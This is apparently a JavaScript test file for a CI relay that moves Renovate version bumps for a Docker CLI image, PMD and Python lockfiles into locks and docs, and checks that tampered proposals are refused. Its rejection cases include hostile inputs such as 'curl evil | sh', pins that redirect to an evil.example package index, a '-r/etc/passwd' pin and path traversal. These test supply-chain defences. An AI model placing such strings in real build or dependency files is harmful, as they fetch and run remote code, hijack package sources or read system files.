
test('Docker CLI relay rejects edits outside the image version and digest before publication', async (t) => {
  const { change, bump, base, head, prepare: prepareDocs, mock, output, stateFile } = dockerCliFixture(t);
  const bumped = bump();
  const beforeState = readFileSync(stateFile, 'utf8');
  for (const [file, content, error, mode] of [
    ['utils/orchestrator/pom.xml', 'unrelated source edit', /Unexpected file/],
    ['README.template.md', 'template edit', /Unexpected file/],
    [dockerCliDockerfile, bumped, /unchanged regular file mode/, '120000'],
    [dockerCliDockerfile, bumped.replace('ARG JAVA_RELEASE=', 'ARG JAVA_RELEASE=1'), /only the Docker CLI image version and digest/],
    [dockerCliDockerfile, bumped.replace('docker:99.1.2-cli', 'evil/docker:99.1.2-cli'), /Expected one digest-pinned stable/],
    [dockerCliDockerfile, bumped.replace('docker:99.1.2-cli', 'docker:99.1.2-rc.1-cli'), /Expected one digest-pinned stable/],
    [dockerCliDockerfile, bumped.replace('-cli-alpine', '-dind-alpine'), /Expected one digest-pinned stable/],
    [dockerCliDockerfile, bumped.replace(/@sha256:0{64}/, ''), /Expected one digest-pinned stable/],
    [dockerCliDockerfile, `${bumped}ARG IMAGE_DOCKER_CLI=docker:1.0.0-cli@sha256:${'1'.repeat(64)}\n`, /Expected one digest-pinned stable/],
    ['README.md', 'unrelated README edit', /Refusing to overwrite/],
  ]) {
    change(dockerCliDockerfile, bumped);
    change(file, content, mode);
    await assert.rejects(prepareDocs(), error);
    for (const reset of [file, dockerCliDockerfile]) {
      if (base.has(reset)) head.set(reset, base.get(reset));
      else head.delete(reset);
    }
    assert.equal(readFileSync(stateFile, 'utf8'), beforeState);
    assert.equal(existsSync(output), false);
  }
  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
});

const pmdDocs = ['README.md', 'docs/LINTING_AND_CODE_QUALITY.md'];

test('Renovate routes only orchestrator PMD engine bumps to the lock and doc relay', () => {
  const rules = config.packageRules.filter((rule) => rule.addLabels?.includes('pmd-version'));
  assert.equal(rules.length, 1);
  assert.deepEqual(rules[0].matchManagers, ['maven']);
  assert.deepEqual(rules[0].matchFileNames, [pmdPom]);
  assert.deepEqual(rules[0].matchPackageNames, ['net.sourceforge.pmd:pmd-core', 'net.sourceforge.pmd:pmd-java']);
  assert.deepEqual(rules[0].matchUpdateTypes, ['major', 'minor', 'patch']);
  assert.equal(rules[0].groupName, 'PMD');
  assert.deepEqual(pmdDocuments().map(({ file }) => file), pmdDocs);
  const workflow = readFileSync(resolveRepoPath('.github/workflows/renovate_framework_sync.yml'), 'utf8');
  assert.match(workflow, /contains\(github.event.pull_request.labels.\*.name, 'pmd-version'\) \|\|\r?\n/);
  assert.match(workflow, /!contains\([^\n]+ 'framework-version'\) &&\s+!contains\([^\n]+ 'nextjs-version'\) &&\s+!contains\([^\n]+ 'action-docs-version'\) &&\s+!contains\([^\n]+ 'docker-cli-version'\) &&\s+contains\([^\n]+ 'pmd-version'\)\s+id: pmd\s[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs prepare-pmd/);
  assert.match(workflow, /!contains\([^\n]+ 'pmd-version'\) &&\s+!contains\([^\n]+ 'docker-cli-version'\) &&\s+contains\([^\n]+ 'python-lock'\)/);
  assert.match(workflow, /steps.pmd.outputs.changed == 'true' \|\|\s+steps.docker_cli_docs.outputs.changed == 'true'\s+env:[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs publish/);
});

function pmdFixture(t, { onWrite, onPublicRequest } = {}) {
  const blobs = new Map();
  const fixture = publicationFixture(t, (route, options) => {
    if (options.method !== 'GET') return onWrite?.(route, JSON.parse(options.body)) ?? assert.fail(route);
    const content = blobs.get(route.slice('git/blobs/'.length));
    assert.ok(content, route);
    return { encoding: 'base64', content: Buffer.from(content).toString('base64') };
  }, onPublicRequest);
  const { base, head, state } = fixture;
  for (const [file, entry] of base) head.set(file, entry);
  const add = (tree, file, content, mode = '100644') => {
    const sha = gitBlobSha(content);
    blobs.set(sha, content);
    tree.set(file, { type: 'blob', mode, sha });
  };
  const pom = readFileSync(resolveRepoPath(pmdPom), 'utf8');
  for (const file of [pmdPom, pmdLock, ...pmdDocs]) {
    const content = readFileSync(resolveRepoPath(file), 'utf8');
    add(base, file, content);
    add(head, file, content);
  }
  const output = path.join(process.env.RUNNER_TEMP, 'output');
  const originalOutput = process.env.GITHUB_OUTPUT;
  process.env.GITHUB_OUTPUT = output;
  t.after(() => {
    if (originalOutput === undefined) delete process.env.GITHUB_OUTPUT;
    else process.env.GITHUB_OUTPUT = originalOutput;
  });
  const event = { number: state.number, pull_request: { base: { sha: state.baseSha } } };
  const current = readPmdVersion(pom);
  const bump = (version = '99.1.2') => pom.replace(`<pmd.version>${current}</pmd.version>`, `<pmd.version>${version}</pmd.version>`);
  return { ...fixture, pom, current, bump, output,
    stateFile: path.join(process.env.RUNNER_TEMP, 'renovate-framework-sync.json'),
    change: (file, content, mode) => add(head, file, content, mode),
    prepare: () => prepare(event, 'synthetic-test-token', 'pmd') };
}

const pmdDigest = '9'.repeat(64);
const pmdRelease = (url) => {
  assert.equal(url, 'https://api.github.com/repos/pmd/pmd/releases/tags/pmd_releases%2F99.1.2');
  return { tag_name: 'pmd_releases/99.1.2', assets: [{ name: 'pmd-dist-99.1.2-bin.zip', digest: `sha256:${pmdDigest}` }] };
};

test('PMD relay pins the upstream digest, renders the docs and repeats as a no-op', async (t) => {
  const writes = [];
  const publicRequests = [];
  const { change, bump, current, prepare: preparePmdRelay, output, stateFile, headTreeSha, state } = pmdFixture(t, {
    onWrite: (route, body) => {
      writes.push({ route, body });
      return { sha: String(writes.length).repeat(40) };
    },
    onPublicRequest: (url, options) => {
      publicRequests.push({ url, options });
      return pmdRelease(url);
    },
  });
  change(pmdPom, bump());
  await preparePmdRelay();
  assert.equal(publicRequests.length, 1);
  assert.equal(publicRequests[0].options.method, 'GET');
  assert.match(readFileSync(output, 'utf8'), /^changed=true\r?\npython_locks=false/m);
  const { changed, files } = JSON.parse(readFileSync(stateFile, 'utf8'));
  assert.deepEqual(changed, ['PMD_VERSION']);
  assert.deepEqual(files.map(({ file }) => file), [pmdLock, ...pmdDocs]);
  assert.equal(files[0].content, formatPmdLock('99.1.2', pmdDigest));
  for (const { file, content } of files.slice(1)) {
    const original = readFileSync(resolveRepoPath(file), 'utf8');
    assert.ok(content.includes('PMD 99.1.2'), file);
    assert.equal(content.replaceAll('PMD 99.1.2', `PMD ${current}`), original, file);
  }
  await publish('synthetic-test-token');
  assert.deepEqual(writes.map(({ route }) => route), ['git/blobs', 'git/blobs', 'git/blobs', 'git/trees', 'git/commits', 'git/refs/heads/renovate%2Fframework']);
  assert.deepEqual(writes[3].body.tree.map(({ path: file }) => file), [pmdLock, ...pmdDocs]);
  assert.ok(writes[3].body.tree.every(({ path: file }) => !file.startsWith('.github/workflows/')), 'No workflow-file permission is needed');
  assert.equal(writes[3].body.base_tree, headTreeSha);
  assert.equal(writes[4].body.message, 'chore: relay the PMD version to its CI lock and docs');
  assert.deepEqual(writes[4].body.parents, [state.headSha]);
  assert.equal(writes[5].body.force, false);
  for (const { file, content } of files) change(file, content);
  await preparePmdRelay();
  await publish('synthetic-test-token');
  assert.equal(writes.length, 6);
});

test('PMD relay rejects other edits and invalid versions before any upstream lookup', async (t) => {
  let lookups = 0;
  const { change, bump, base, head, prepare: preparePmdRelay, mock, output, stateFile } = pmdFixture(t, {
    onPublicRequest: (url) => {
      lookups += 1;
      return pmdRelease(url);
    },
  });
  const bumped = bump();
  const beforeState = readFileSync(stateFile, 'utf8');
  for (const [file, content, error, mode] of [
    ['utils/orchestrator/Dockerfile', 'unrelated source edit', /Unexpected file/],
    ['.github/workflows/pmd.yml', 'workflow edit', /Unexpected file/],
    ['README.template.md', 'template edit', /Unexpected file/],
    [pmdPom, bumped, /unchanged regular file mode/, '120000'],
    [pmdPom, bumped.replace(/<maven-pmd-plugin\.version>[^<]+</, '<maven-pmd-plugin.version>9.9.9<'), /only the <pmd\.version> property/],
    [pmdPom, bump('99.1.2-rc1'), /stable X\.Y\.Z/],
    [pmdPom, bump('99.1.2/../../evil'), /stable X\.Y\.Z/],
    [pmdPom, bump('99.1.2%2F..'), /stable X\.Y\.Z/],
    [pmdPom, bump('99.1.2\n'), /stable X\.Y\.Z/],
    [pmdPom, `${bumped}<pmd.version>99.1.2</pmd.version>`, /Expected one <pmd\.version>/],
  ]) {
    change(pmdPom, bumped);
    change(file, content, mode);
    await assert.rejects(preparePmdRelay(), error);
    for (const reset of [file, pmdPom]) {
      if (base.has(reset)) head.set(reset, base.get(reset));
      else head.delete(reset);
    }
    assert.equal(readFileSync(stateFile, 'utf8'), beforeState);
    assert.equal(existsSync(output), false);
  }
  assert.equal(lookups, 0, 'Rejected proposals never reach the upstream release API');
  // Existing PR edits to generated files are refused after the lookup, before any write.
  for (const file of [pmdLock, 'README.md']) {
    change(pmdPom, bumped);
    change(file, `unrelated edit to ${file}`);
    await assert.rejects(preparePmdRelay(), /Refusing to overwrite/);
    head.set(file, base.get(file));
    head.set(pmdPom, base.get(pmdPom));
  }
  assert.equal(lookups, 2);
  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
});

const [wsgiLock, asgiLock] = pythonRuntimeLocks;
const readLocks = () => Object.fromEntries(pythonRuntimeLocks.map((file) => [file, readFileSync(resolveRepoPath(file), 'utf8')]));
const pinValuePattern = /^\S+/;
const findPin = (content, name) => {
  const prefix = `${name}==`;
  let start = 0;
  while (start <= content.length) {
    const end = content.indexOf('\n', start);
    const lineEnd = end === -1 ? content.length : end;
    if (content.startsWith(prefix, start)) {
      const valueStart = start + prefix.length;
      const value = pinValuePattern.exec(content.slice(valueStart, lineEnd))[0];
      return { valueStart, valueEnd: valueStart + value.length, value };
    }
    if (end === -1) break;
    start = end + 1;
  }
  throw new Error(`Missing ${name} pin`);
};
const bumpPin = (content, name, version) => {
  const { valueStart, valueEnd } = findPin(content, name);
  return `${content.slice(0, valueStart)}${version}${content.slice(valueEnd)}`;
};
const lockedPin = (content, name) => findPin(content, name).value;

test('Python lock relay accepts only released pin-version edits outside the env-managed packages', () => {
  const base = readLocks();
  const proposed = { [wsgiLock]: bumpPin(base[wsgiLock], 'cachetools', '9.0.0'), [asgiLock]: bumpPin(base[asgiLock], 'cachetools', '9.0.0') };
  assert.deepEqual(validatePythonLockChange(base, base), []);
  assert.deepEqual(validatePythonLockChange(base, proposed).map(({ file, packageName, to }) => [file, packageName, to]),
    [[wsgiLock, 'cachetools', '9.0.0'], [asgiLock, 'cachetools', '9.0.0']]);
  for (const version of ['0.67b0', '1.2rc1', '2.0.post1']) {
    assert.equal(validatePythonLockChange(base, { ...base, [asgiLock]: bumpPin(base[asgiLock], 'opentelemetry-distro', version) })[0].to, version);
  }
  const crlf = Object.fromEntries(Object.entries(base).map(([file, content]) => [file, content.replaceAll('\n', '\r\n')]));
  assert.equal(validatePythonLockChange(crlf, { ...crlf, [asgiLock]: bumpPin(crlf[asgiLock], 'cachetools', '9.0.0') })[0].to, '9.0.0');
  for (const [content, error] of [
    [bumpPin(base[asgiLock], 'cachetools', '9.0.0.dev1'), /released package version/],
    [bumpPin(base[asgiLock], 'cachetools', '9.0.0+local'), /released package version/],
    [bumpPin(base[asgiLock], 'cachetools', '--index-url=https://evil.example/'), /released package version/],
    [bumpPin(base[asgiLock], 'gunicorn', '99.0.0'), /gunicorn is pinned from compose\/\.env/],
    [bumpPin(base[asgiLock], 'django', '99.0.0'), /django is pinned from compose\/\.env/],
    [`${base[asgiLock]}evil==1.0.0\n`, /only existing pin versions/],
    [`--extra-index-url https://evil.example/\n${base[asgiLock]}`, /only existing pin versions/],
    [base[asgiLock].replace('    # via uvicorn', '    # via evil'), /only existing pin versions/],
    [`${base[asgiLock]}cachetools==9.0.0\n`, /Duplicate cachetools/],
  ]) assert.throws(() => validatePythonLockChange(base, { ...base, [asgiLock]: content }), error);
  assert.throws(() => validatePythonLockChange(base, { [asgiLock]: base[asgiLock] }), /exactly the Django runtime locks/);
  assert.throws(() => validatePythonLockChange(base, { ...base, 'compose/.env': 'X: 1' }), /exactly the Django runtime locks/);
});

test('Python lock regeneration reproduces pins with the trusted compiler and fails closed on drift', (t) => {
  const workspace = temporaryDirectory(t, 'python-lock-relay-');
  const base = readLocks();
  const write = (file, content) => {
    mkdirSync(path.dirname(path.join(workspace, file)), { recursive: true });
    writeFileSync(path.join(workspace, file), content);
  };
  const reset = () => { for (const [file, content] of Object.entries(base)) write(file, content); };
  const proposed = { ...base, [asgiLock]: bumpPin(base[asgiLock], 'cachetools', '9.0.0') };
  const calls = [];
  const compiler = (output) => (command, args, cwd) => {
    calls.push([command, args, cwd]);
    if (command !== 'python') return;
    const file = args.find((arg) => arg.startsWith('--output-file=')).slice('--output-file='.length);
    write(file, output(file));
  };
  reset();
  const changes = regeneratePythonRuntimeLocks(proposed, { workspace, run: compiler((file) => proposed[file]) });
  assert.deepEqual(changes.map(({ packageName }) => packageName), ['cachetools']);
  assert.deepEqual(calls, [
    ['python', ['-m', 'piptools', 'compile', '--strip-extras', '--upgrade-package', 'cachetools==9.0.0',
      '--pip-args=--only-binary :all:', `--output-file=${asgiLock}`, asgiLock.replace('requirements.txt', 'requirements.in')], workspace],
    ['bash', ['.github/requirements/update-lock.sh'], workspace],
  ]);

  calls.length = 0;
  reset();
  assert.throws(() => regeneratePythonRuntimeLocks(proposed, { workspace, run: compiler((file) => `${proposed[file]}newdep==1.0.0\n`) }),
    /differs from trusted pip-compile regeneration/);
  assert.equal(calls.length, 1, 'update-lock.sh must not run after a mismatch');

  for (const malicious of [bumpPin(base[asgiLock], 'cachetools', '-r/etc/passwd'), bumpPin(base[asgiLock], 'django', '9.9.9'), `${base[asgiLock]}-e .\n`]) {
    calls.length = 0;
    reset();
    assert.throws(() => regeneratePythonRuntimeLocks({ ...base, [asgiLock]: malicious }, { workspace, run: compiler(() => assert.fail('compiled')) }));
    assert.equal(calls.length, 0);
  }
  // Stored state cannot choose the comparison base: the trusted checkout supplies it.
  calls.length = 0;
  write(asgiLock, bumpPin(base[asgiLock], 'cachetools', '0.0.1'));
  write(wsgiLock, base[wsgiLock]);
  const reverted = regeneratePythonRuntimeLocks(base, { workspace, run: compiler((file) => base[file]) });
  assert.deepEqual(reverted.map(({ from, to }) => [from, to]), [['0.0.1', lockedPin(base[asgiLock], 'cachetools')]]);
});

test('committed runtime locks are in the trusted pip-compile output form, so pin-only proposals can match', () => {
  // Captured from pip-tools 7.6.2 on Linux (python:3.13.18-slim-bookworm) for runtimeLockCompileArgs(lock),
  // with and without --upgrade-package selectors: pip-tools omits the selectors from the header.
  for (const lock of pythonRuntimeLocks) {
    const input = lock.replace('requirements.txt', 'requirements.in');
    const header = [
      '#', '# This file is autogenerated by pip-compile with Python 3.13', '# by the following command:', '#',
      `#    pip-compile --output-file=${lock} --pip-args='--only-binary :all:' --strip-extras ${input}`, '#',
      '--only-binary :all:', '', '',
    ].join('\n');
    const content = readFileSync(resolveRepoPath(lock), 'utf8').replaceAll('\r\n', '\n');
    assert.ok(content.startsWith(header), `${lock} must be regenerated with runtimeLockCompileArgs on Linux`);
    assert.deepEqual(runtimeLockCompileArgs(lock, ['cachetools==9.0.0']), ['-m', 'piptools', 'compile', '--strip-extras',
      '--upgrade-package', 'cachetools==9.0.0', '--pip-args=--only-binary :all:', `--output-file=${lock}`, input]);
    // Windows-only markers (Django's tzdata) would make Linux regeneration differ from the committed lock.
    assert.doesNotMatch(content, /^tzdata==/m);
  }
});

function pythonLockFixture(t, onWrite) {
  const blobs = new Map();
  const fixture = publicationFixture(t, (route, options) => {
    if (options.method !== 'GET') return onWrite?.(route, JSON.parse(options.body)) ?? assert.fail(route);
    const content = blobs.get(route.slice('git/blobs/'.length));
    assert.ok(content, route);
    return { encoding: 'base64', content: Buffer.from(content).toString('base64') };
  });
  const { base, head, state } = fixture;
  for (const [file, entry] of base) head.set(file, entry);
  const add = (tree, file, content, mode = '100644') => {
    const sha = gitBlobSha(content);
    blobs.set(sha, content);
    tree.set(file, { type: 'blob', mode, sha });
  };
  const locks = readLocks();
  for (const [file, content] of Object.entries(locks)) {
    add(base, file, content);
    add(head, file, content);
  }
  const output = path.join(process.env.RUNNER_TEMP, 'output');
  const originalOutput = process.env.GITHUB_OUTPUT;
  process.env.GITHUB_OUTPUT = output;
  t.after(() => {
    if (originalOutput === undefined) delete process.env.GITHUB_OUTPUT;
    else process.env.GITHUB_OUTPUT = originalOutput;
  });
  const event = { number: state.number, pull_request: { base: { sha: state.baseSha } } };
  return { ...fixture, locks, output, stateFile: path.join(process.env.RUNNER_TEMP, 'renovate-framework-sync.json'),
    change: (file, content, mode) => add(head, file, content, mode),
    prepare: () => prepare(event, 'synthetic-test-token', 'pythonLock') };
}

test('Python lock route prepares validated pins for the trusted compiler without writing to the PR', async (t) => {
  const { change, locks, prepare: preparePins, output, stateFile, mock } = pythonLockFixture(t);
  const proposed = { [wsgiLock]: bumpPin(locks[wsgiLock], 'cachetools', '9.0.0'), [asgiLock]: bumpPin(locks[asgiLock], 'cachetools', '9.0.0') };
  for (const file of pythonRuntimeLocks) change(file, proposed[file]);
  await preparePins();
  assert.match(readFileSync(output, 'utf8'), /^changed=true\r?\npython_locks=true/m);
  const saved = JSON.parse(readFileSync(stateFile, 'utf8'));
  assert.equal(saved.route, 'pythonLock');
  assert.deepEqual(saved.changed, ['cachetools']);
  assert.deepEqual(saved.proposed, proposed);
  // Without the trusted regeneration step, publication refuses to replace the PR's lock edits.
  await assert.rejects(publish('synthetic-test-token'), /Refusing to overwrite a PR edit/);
  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
});

test('Python lock route reports no change when the runtime locks are untouched', async (t) => {
  const { prepare: preparePins, output, stateFile } = pythonLockFixture(t);
  await preparePins();
  assert.match(readFileSync(output, 'utf8'), /^changed=false\r?\npython_locks=false/m);
  assert.deepEqual(JSON.parse(readFileSync(stateFile, 'utf8')).changed, []);
});

test('Python lock route rejects unrelated files and env-managed pins before state or output', async (t) => {
  const { change, locks, base, head, prepare: preparePins, mock, output, stateFile } = pythonLockFixture(t);
  const beforeState = readFileSync(stateFile, 'utf8');
  for (const [file, content, error, mode] of [
    ['services/python/django/gunicorn/common/src/evil.py', 'import os', /Unexpected file/],
    ['.github/requirements/update-lock.sh', 'curl evil | sh', /Unexpected file/],
    [asgiLock, bumpPin(locks[asgiLock], 'gunicorn', '99.0.0'), /pinned from compose\/\.env/],
    [asgiLock, `${locks[asgiLock]}--index-url https://evil.example/\n`, /only existing pin versions/],
    [asgiLock, bumpPin(locks[asgiLock], 'cachetools', '9.0.0'), /unchanged regular file mode/, '120000'],
  ]) {
    change(file, content, mode);
    await assert.rejects(preparePins(), error);
    if (base.has(file)) head.set(file, base.get(file));
    else head.delete(file);
    assert.equal(readFileSync(stateFile, 'utf8'), beforeState);
    assert.equal(existsSync(output), false);
  }
  assert.ok(mock.mock.calls.every(({ arguments: [, options] }) => options.method === 'GET'));
});

test('Renovate labels only runtime lock pin bumps for the trusted Python lock relay', () => {
  const byName = (left, right) => left.localeCompare(right);
  const rules = config.packageRules.filter((rule) => rule.addLabels?.includes('python-lock'));
  assert.equal(rules.length, 1);
  assert.deepEqual(rules[0].matchManagers, ['pip_requirements']);
  assert.deepEqual(rules[0].matchFileNames.toSorted(byName), pythonRuntimeLocks.toSorted(byName));
  assert.equal(rules[0].rebaseWhen, 'behind-base-branch');
  const envManaged = config.packageRules.findIndex((rule) => rule.enabled === false && rule.matchPackageNames?.includes('gunicorn'));
  assert.ok(config.packageRules.indexOf(rules[0]) < envManaged, 'env-managed packages must stay disabled after the label rule');
  const projections = config.packageRules.find((rule) => rule.enabled === false
    && rule.matchFileNames?.includes('services/python/django/gunicorn/build-requirements.txt'));
  assert.ok(projections.matchFileNames.includes('services/python/django/gunicorn/pip-requirements.txt'));
  const workflow = readFileSync(resolveRepoPath('.github/workflows/renovate_framework_sync.yml'), 'utf8');
  assert.match(workflow, /contains\(github.event.pull_request.labels.\*.name, 'python-lock'\) \|\|\r?\n/);
  assert.match(workflow, /!contains\([^\n]+ 'docker-cli-version'\) &&\s+contains\([^\n]+ 'python-lock'\)\s+id: python_lock[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs prepare-python-lock/);
  assert.match(workflow, /steps\.python_lock\.outputs\.python_locks == 'true'\r?\n\s+run: \|\r?\n\s+python -m pip install --require-hashes/);
  assert.match(workflow, /lock-compiler\.in\r?\n[\s\S]*?if: steps\.python_lock\.outputs\.changed == 'true'\r?\n\s+run: node scripts\/versions\/renovate-framework-sync.mjs relay-python-lock\r?\n[\s\S]*?node scripts\/versions\/sync-framework-versions.mjs --check\r?\n\s+python services\/python\/django\/gunicorn\/sync_build_locks.py --check/);
  assert.match(workflow, /steps.python_lock.outputs.changed == 'true' \|\|[\s\S]*?run: node scripts\/versions\/renovate-framework-sync.mjs publish/);
});
